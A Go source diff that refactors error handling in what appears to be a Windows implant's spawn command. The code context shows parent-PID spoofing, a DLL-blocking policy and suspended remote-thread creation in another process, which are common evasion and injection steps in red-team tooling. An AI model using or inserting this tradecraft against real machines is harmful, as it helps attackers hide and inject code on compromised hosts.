@@ -122,21 +122,13 @@ type SpawnParams struct {
 // Execute executes the spawn command
 func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
 	if runtime.GOOS != "windows" {
-		return structs.CommandResult{
-			Output:    "Error: This command is only supported on Windows",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: This command is only supported on Windows")
 	}
 
 	var params SpawnParams
 	err := json.Unmarshal([]byte(task.Params), &params)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	params.Mode = strings.ToLower(params.Mode)
@@ -147,11 +139,7 @@ func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
 	case "thread":
 		return spawnSuspendedThread(params.PID)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: Unknown mode '%s'. Use 'process' or 'thread'", params.Mode),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: Unknown mode '%s'. Use 'process' or 'thread'", params.Mode)
 	}
 }
 
@@ -161,11 +149,7 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 	output += "[*] Spawn Mode: Suspended Process\n"
 
 	if path == "" {
-		return structs.CommandResult{
-			Output:    output + "Error: No executable path specified",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + "Error: No executable path specified")
 	}
 
 	output += fmt.Sprintf("[*] Target executable: %s\n", path)
@@ -173,11 +157,7 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 	// Convert path to UTF16 for CreateProcessW
 	commandLine, err := syscall.UTF16PtrFromString(path)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error converting path: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error converting path: %v", err))
 	}
 
 	creationFlags := uint32(CREATE_SUSPENDED | CREATE_NEW_CONSOLE)
@@ -215,11 +195,7 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 			uintptr(unsafe.Pointer(&attrListSize)),
 		)
 		if ret == 0 {
-			return structs.CommandResult{
-				Output:    output + fmt.Sprintf("Error: InitializeProcThreadAttributeList failed: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorResult(output + fmt.Sprintf("Error: InitializeProcThreadAttributeList failed: %v", err))
 		}
 		defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(attrList)))
 
@@ -230,11 +206,7 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 
 			hParent, errOpen := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(ppid))
 			if errOpen != nil {
-				return structs.CommandResult{
-					Output:    output + fmt.Sprintf("Error: OpenProcess on PPID %d failed: %v", ppid, errOpen),
-					Status:    "error",
-					Completed: true,
-				}
+				return errorResult(output + fmt.Sprintf("Error: OpenProcess on PPID %d failed: %v", ppid, errOpen))
 			}
 			parentHandle = hParent
 			defer windows.CloseHandle(parentHandle)
@@ -249,11 +221,7 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 				0, // lpReturnSize
 			)
 			if ret == 0 {
-				return structs.CommandResult{
-					Output:    output + fmt.Sprintf("Error: UpdateProcThreadAttribute (PPID) failed: %v", err),
-					Status:    "error",
-					Completed: true,
-				}
+				return errorResult(output + fmt.Sprintf("Error: UpdateProcThreadAttribute (PPID) failed: %v", err))
 			}
 			output += "[+] PPID attribute set\n"
 		}
@@ -273,11 +241,7 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 				0,
 			)
 			if ret == 0 {
-				return structs.CommandResult{
-					Output:    output + fmt.Sprintf("Error: UpdateProcThreadAttribute (BlockDLLs) failed: %v", err),
-					Status:    "error",
-					Completed: true,
-				}
+				return errorResult(output + fmt.Sprintf("Error: UpdateProcThreadAttribute (BlockDLLs) failed: %v", err))
 			}
 			output += "[+] DLL blocking policy set\n"
 		}
@@ -301,11 +265,7 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 			uintptr(unsafe.Pointer(&processInfo)),
 		)
 		if ret == 0 {
-			return structs.CommandResult{
-				Output:    output + fmt.Sprintf("Error: CreateProcess failed: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorResult(output + fmt.Sprintf("Error: CreateProcess failed: %v", err))
 		}
 	} else {
 		// Simple case: no extended attributes needed
@@ -325,11 +285,7 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 			uintptr(unsafe.Pointer(&processInfo)),
 		)
 		if ret == 0 {
-			return structs.CommandResult{
-				Output:    output + fmt.Sprintf("Error: CreateProcess failed: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorResult(output + fmt.Sprintf("Error: CreateProcess failed: %v", err))
 		}
 	}
 
@@ -347,11 +303,7 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 	windows.CloseHandle(processInfo.Thread)
 	windows.CloseHandle(processInfo.Process)
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // spawnSuspendedThread creates a new suspended thread in an existing process
@@ -360,11 +312,7 @@ func spawnSuspendedThread(pid int) structs.CommandResult {
 	output += "[*] Spawn Mode: Suspended Thread\n"
 
 	if pid <= 0 {
-		return structs.CommandResult{
-			Output:    output + "Error: Invalid PID specified",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + "Error: Invalid PID specified")
 	}
 
 	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
@@ -377,11 +325,7 @@ func spawnSuspendedThread(pid int) structs.CommandResult {
 	)
 
 	if hProcess == 0 {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error: OpenProcess failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error: OpenProcess failed: %v", err))
 	}
 	output += fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess)
 
@@ -392,11 +336,7 @@ func spawnSuspendedThread(pid int) structs.CommandResult {
 
 	if hKernel32 == 0 {
 		windows.CloseHandle(windows.Handle(hProcess))
-		return structs.CommandResult{
-			Output:    output + "Error: Failed to get kernel32.dll handle",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + "Error: Failed to get kernel32.dll handle")
 	}
 
 	sleepProc, _ := syscall.BytePtrFromString("Sleep")
@@ -404,11 +344,7 @@ func spawnSuspendedThread(pid int) structs.CommandResult {
 
 	if sleepAddr == 0 {
 		windows.CloseHandle(windows.Handle(hProcess))
-		return structs.CommandResult{
-			Output:    output + "Error: Failed to get Sleep address",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + "Error: Failed to get Sleep address")
 	}
 
 	output += fmt.Sprintf("[*] Using kernel32!Sleep (0x%X) as thread start address\n", sleepAddr)
@@ -427,11 +363,7 @@ func spawnSuspendedThread(pid int) structs.CommandResult {
 
 	if hThread == 0 {
 		windows.CloseHandle(windows.Handle(hProcess))
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error: CreateRemoteThread failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error: remote thread creation failed: %v", err))
 	}
 
 	output += "[+] Thread created successfully in SUSPENDED state\n"
@@ -446,9 +378,5 @@ func spawnSuspendedThread(pid int) structs.CommandResult {
 	windows.CloseHandle(windows.Handle(hThread))
 	windows.CloseHandle(windows.Handle(hProcess))
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
